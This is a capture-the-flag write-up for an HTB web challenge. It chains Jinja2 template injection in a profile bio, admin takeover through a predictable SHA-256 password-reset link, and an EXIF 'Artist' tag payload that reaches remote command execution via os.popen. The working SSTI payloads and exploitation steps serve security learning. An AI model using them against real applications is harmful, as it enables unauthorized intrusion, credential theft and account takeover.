# Web Guild - HTB ctf - web 1000

Welcome to the Guild ! But please wait until our Guild Master verify you. Thanks for the wait

## Initial entry point - SSTI

After creating an account and submitting a random image file for the verification, we are able to create a page for our account and edit the bio. The bio uses Jinja2 templating and is vulnerable to SSTI.

I first test SSTI with {{2+2}} as my bio and "4" gets rendered on the page.

After trying multiple different SSTI payloads, RCE attempts, a look at the code lets us see what we are able to run. Since anything within the template {{}} is python, the following payloads enumerate the admin user's info.

```{{User.query.filter_by(username='admin').first()}}```

Returns: ```<User 1>```

```{{User.query.filter_by(username='admin').first().email}}```

Returns: ```3737653936786a79@master.guild```

```{{User.query.filter_by(username='admin').first().password}}```

Returns: ```scrypt:32768:8:1$gQxbef74TPLGNDcL$ae06d7782575f467a2cdd6edc68727454ee08a2f8d033fb8c1d29f735a6d7fdbeac0ee704d7c02372adbe0775e2a98c040520d124ebcb059c3075531a6b6770c```

## Privilege Escalation to Admin account

Use /forgetpassword endpoint. The following code checks to see if email is registered, then creates a link to a reset page. Because we know the admin email we can just recreate the hash on our own and visit the page:

```
@views.route("/forgetpassword", methods=["GET", "POST"])
def forgetpassword():
    if request.method == "POST":
        email = request.form.get("email")
        query = User.query.filter_by(email=email).first()
        flash("If email is registered then you will get a link to reset password!", category="success")
        if query:
            # send email the below link
            reset_url = str(hashlib.sha256(email.encode()).hexdigest())
            print(reset_url)
            new_query = Validlinks(email=email, validlink=reset_url)
            db.session.add(new_query)
            db.session.commit()
        
        return redirect(url_for("views.home"))

    return render_template("forgetpassword.html", user=current_user)
```

So I simply recreate the hash with python:

```
>>> import hashlib
>>> email = '3737653936786a79@master.guild'
>>> reset_url = str(hashlib.sha256(email.encode()).hexdigest())
>>> print(reset_url)
e407cfec1ae6a98c0635645f2bc14b3fa363c34975bfa75ddd465cbfebe8bdc0
```

Visiting /changepasswd/--hash--:

---

After changing the admin account's password, I can view their dashboard to verify the png we uploaded earlier.

---

## Admin Dashboard/Verification

Once authenticated as admin, we are authorized to perform user verification based on the png they send. The code below shows how the site determines verified users:


```
@views.route("/verify",methods=["GET", "POST"])
@login_required
def verify():
    if current_user.username == "admin":
        if request.method == "POST":
            user_id = request.form.get("user_id")
            verf_id = request.form.get("verification_id")
            query = Verification.query.filter_by(id=verf_id).first()
            
            img = Image.open(query.doc)

            exif_table={}

            for k, v in img.getexif().items():
                tag = TAGS.get(k)
                exif_table[tag]=v

            if "Artist" in exif_table.keys():
                sec_code = exif_table["Artist"]
                query.verified = 1
                db.session.commit()
                return render_template_string("Verified! {}".format(sec_code))
            else:
                return render_template_string("Not Verified! :(")
    else:
        flash("Oops", category="error")
        return redirect(url_for("views.home"))
```

The code shows that the site simply checks to see if "Artist" tag is in PNG metadata. If it is, "Verified!" pops up on page along with whatever value "Artist" is.


To get verified, find random jpg and add the "Artist" tag


```
exiftool -Artist=1 picture.jpg
```

Verified accounts:

---

Trying to login to those accounts results in a server error, too many redirects?

The final step must be accessing the flag through the "Verified" page that shows up when a user gets verified.

I try another SSTI for the "Artist" tag value to see if that gets rendered improperly on the page. I set Artist to "{{2+2}}" and the results of the verification:

---

From here I try RCE:

```exiftool -Artist="{{ config.__class__.__init__.__globals__['os'].popen('ls -la').read() }}" 1.jpeg```

Results:

---

To get the flag, I just have to change the command to "cat flag.txt".



# References/Learning

- jinja2 template syntax
	- {% ... %}
	- {{}}
- bug discovered on uber.com with jinja temp injection https://hackerone.com/reports/125980
- scrypt hash format
	- ```scrypt:N:R:P$<salt>$<hashed_password>```
		- N: The CPU/memory cost factor, which controls how expensive the computation is. The larger the value, the harder the hash is to compute.
		- R: The block size (also called the "row size").
		- P: The parallelization factor, which controls how many parallel iterations are used.
		- ```<salt>```: A random string (typically encoded in base64 or hexadecimal) that is used to ensure that the same password generates different hashes each time it's hashed.
		- ```<hashed_password>```: The actual password hash, typically the result of the scrypt function, which combines the password, salt, and other parameters.
- https://flask-login.readthedocs.io/en/latest/